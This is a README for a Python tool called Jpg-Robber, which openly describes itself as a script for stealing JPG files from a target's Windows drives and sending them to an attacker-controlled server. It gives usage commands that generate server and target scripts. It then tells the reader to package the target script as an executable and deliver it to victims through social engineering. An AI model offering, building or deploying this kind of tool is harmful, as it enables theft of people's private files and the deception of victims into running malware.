# Jpg-Robber
A python script for stealing Jpg files through the network. 
This script allows you to identify files with jpg format in the target system and  drives then quickly send and save files to your server through the network.

## Usage

1-First, run this command in the path of the robber.py on your terminal:

```bash
python robber.py [Your server IPV4] [Your custom port]
```
Also you can use :
```bash
python robber.py -h
```

Example: 
```bash
python robber.py 192.168.1.1 1234
```
Note: make sure that the port you enter can be used on your target system and your server

2-After the server.py & target.py were created in your path , Run the server.py  on your server And about target.py you can use the pyinstaller library According to your needs, convert it into an executable file and give it to your target or run it on the target system through social engineering.
Note that this script is programmed to find jpg files in Windows

## Dependencies
- python 3.9.6
- pyfiglet (can be installed via `pip install pyfiglet`)
